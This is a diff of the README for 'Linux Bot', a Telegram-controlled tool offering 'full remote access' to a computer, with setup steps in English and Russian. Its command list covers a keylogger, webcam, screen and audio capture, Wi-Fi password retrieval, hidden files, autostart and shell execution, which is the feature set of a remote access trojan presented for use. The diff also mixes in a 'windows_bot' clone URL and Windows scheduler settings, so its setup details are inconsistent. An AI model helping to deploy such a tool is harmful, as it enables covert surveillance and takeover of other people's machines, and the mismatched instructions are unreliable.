@@ -1,6 +1,5 @@
 # 🌟 Linux Bot
 
-## AS SOON AS HUGE UPDATE
 
 <br><br>
 
@@ -13,84 +12,92 @@ Core Commands
     -------                   -----------   
     author                    Information about creator of this project                                         
     help                      Help menu
-    libs_error                Python libraries errors
-    module                    Module control
+    repeat                    Repeat command
     session                   About this session
-    accounts                  Control accounts connected to this computer session 
-    getuid                    Get the user on whose behalf the bot is running
-    getpid                    Get the current process identifier
-    exit                      Log out of this computer session
-                                                              
+    getpid                    Current pid
+    getuid                    Current user
+    config                    Bot config control
+    account                   Control accounts connected to this computer
+    autostart                 Bot autostart   
+    restart                   Restart bot    
+    exit                      Log out of this session
+                 
 
 File System Commands 
 ====================
 
     Command                   Description
     -------                   -----------                                                                                                                                                        
-    pwd                       Display working directory
-    cd                        Change directory
-    ls                        List files in working directory  
-    hide                      Hide folder or file
-    unhide                    Unhide folder or file                               
-    mkdir                     Create folder
-    mkfile                    Create file
-    rn                        Rename folder or file
-    rmdir                     Delete folder            
-    rm                        Delete file  
-    cp                        Copy folder or file to destination
-    mv                        Move folder or file to destination
-    download                  Download file
-    upload                    Upload file
-    encrypt                   Encrypt file
-    decrypt                   Decrypt file
-
-                                                              
+    pwd                       Get working directory
+    cd                        Change directory         
+    ls                        Get information about files or dirs in working directory    
+    mkfile                    Create file               
+    mkdir                     Create dir              
+    rn                        Rename file or dir
+    rm                        Delete file 
+    rmdir                     Delete dir                          
+    cp                        Copy file or dir
+    mv                        Move file or dir
+    chmod                     Change file or dir mode
+    hide                      Hide file or dir 
+    unhide                    Unhide file or dir                        
+    cat                       Download file
+    zip                       Make archive current directory
+                 
+                 
 Networking Commands
 ===================
 
     Command                   Description
     -------                   -----------         
-    network                   Network control
-    ipconfig                  Get network interfaces
+    inet                      Enable or disable Internet
+    ipconfig                  Get network interfaces     
     route                     Get routing table
     arp                       Get host ARP cache                                                                                     
     netstat                   Get network connections
-    site                      Website control  
-                                                                                               
-                                               
+    wifi                      Find Wi-Fi or get Wi-Fi password
+    site                      Website utilities
+
+                                 
 System Commands                                                    
 ===============
 
     Command                   Description
-    -------                   -----------                                                                                                           
-    systeminfo                Get information about computer
-    buffer                    Get data from buffer
-    services                  Get information about services
-    tasks                     Get information about tasks
-    startup                   Get information about startup
-    paths                     Get paths to all folders on computer
-    app                       Application control   
-    ps                        List running processes
-    kill                      Terminate process
-    time                      Get current time or change current time
-    date                      Get current date or change current date
-    cmd                       Execute command in cmd and working with cmd history
-    reboot                    Computer reboot
-    shutdown                  Computer shutdown
+    -------                   -----------      
+    dmesg                     Get kernel messages                                                                            
+    systeminfo                Get information about computer  
+    lshw                      Get information about computer using lshw
+    modprobe                  Modprobe utilities
+    service                   Service utilities 
+    crontab                   Crontab utilities 
+    startup                   Startup utilities   
+    env                       Environment utilities
+    user                      User utilities                 
+    block                     Block app utilities    
+    ps                        Get information about running processes 
+    kill                      Terminate process    
+    run                       Launch file     
+    cmd                       Execute command in shell     
+    time                      Get current time or change current time   
+    date                      Get current date or change current date   
+    sleep                     Sleep computer
+    reboot                    Reboot computer         
+    shutdown                  Shutdown computer       
 
-                                                                                                            
+                 
 User Interface Commands                                                  
 =======================
 
     Command                   Description
     -------                   -----------
-    screenshot                Take screenshot of desktop
-    screenshot_webcam         Take screenshot using webcam 
-    play                      Record audio or video from screen or video from webcam
-    mouse                     Mouse control 
-    keyboard                  Keyboard control                                                                                                                                         
-    keylogger                 Control collected keylogger data
-    show                      Display message
+    mouse                     Mouse utilities         
+    keyboard                  Keyboard utilities                                                                                                                                       
+    clipboard                 Clipboard utilities                    
+    screen                    Take screenshot of screen 
+    webcam                    Take screenshot of webcam
+    audio                     Record audio or play audio 
+    msg                       Display message                     
+    keylogger                 Keylogger utilities 
 ```
 
     
@@ -117,12 +124,18 @@ linux_bot — Provide full remote access to the system
 
 ``` bash
 # Clone the repository
-git clone https://github.com/cppandpython/linux_bot.git
+git clone https://github.com/cppandpython/windows_bot.git
 
-# Edit in bot.py
-TOKEN = 'YOUR TELEGRAM BOT TOKEN'
-PATH = 'YOUR BOT PATH'
-PASSWORD = 'YOUR PASSWORD'
+# Change consts ​​in bot.py
+TOKEN = TELEGRAM BOT TOKEN
+PASSWORD = PASSWORD FOR SESSION WITH TELEGRAM BOT
+SEED = ACCEPTABLE VALUE TYPE int # RESPONSIBLE FOR ENCRYPTION INITIAL VALUES  
+PATH = PATH TO SAVE TELEGRAM BOT
+
+BOT_FILE_NAME = HOW TO SAVE TELEGRAM BOT NAME IN PATH
+BOT_TASK_NAME = TASK NAME IN SCHEDULE FOR TELEGRAM BOT # NECESSARY IF BOT_EXE IS True
+BOT_TASK_DESCRIPTION = TASK DESCRIPTION IN SCHEDULE FOR TELEGRAM BOT # NECESSARY IF BOT_EXE IS True
+BOT_EXE = TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
 
 # Launch
 python bot.py
@@ -152,12 +165,18 @@ linux_bot — Обеспечивает полный удаленный дост�
 
 ```bash
 # Клонируй репозиторий
-git clone https://github.com/cppandpython/linux_bot.git
+git clone https://github.com/cppandpython/windows_bot.git
 
-# Изменить в bot.py
-TOKEN = 'ВАШ ТЕЛЕГРАМ ТОКЕН БОТА'
-PATH = 'ВАШ ПУТЬ ДЛЯ БОТА'
-PASSWORD = 'ВАШ ПАРОЛЬ'
+# Изменить константы в bot.py
+TOKEN = ТОКЕН TELEGRAM-БОТА
+PASSWORD = ПАРОЛЬ ДЛЯ СЕССИИ С TELEGRAM-БОТОМ
+SEED = ДОПУСТИМОЕ ЗНАЧЕНИЕ ШИФРОВАНИЯ TELEGRAM-БОТА ТИП int # ОТВЕТСТВЕННЫЙ ЗА НАЧАЛЬНЫЕ ЗНАЧЕНИЯ ШИФРОВАНИЯ  
+PATH = ПУТЬ ДЛЯ СОХРАНЕНИЯ TELEGRAM-БОТА
+
+BOT_FILE_NAME = ИМЯ ФАЙЛА TELEGRAM-БОТА ДЛЯ СОХРАНЕНИЯ В PATH
+BOT_TASK_NAME = ИМЯ ЗАДАЧИ В ПЛАНИРОВЩИКЕ ДЛЯ TELEGRAM-БОТА # НЕОБХОДИМО ЕСЛИ BOT_EXE ЯВЛЯЕТСЯ True
+BOT_TASK_DESCRIPTION = ОПИСАНИЕ ЗАДАЧИ В ПЛАНИРОВЩИКЕ ДЛЯ TELEGRAM-БОТА # НЕОБХОДИМО ЕСЛИ BOT_EXE ЯВЛЯЕТСЯ True
+BOT_EXE = TELEGRAM-БОТ БУДЕТ ЗАПУЩЕН В РЕЖИМЕ (EXE ЕСЛИ BOT_EXE == True ИНАЧЕ PYTHON)
 
 # Запуск
 python bot.py
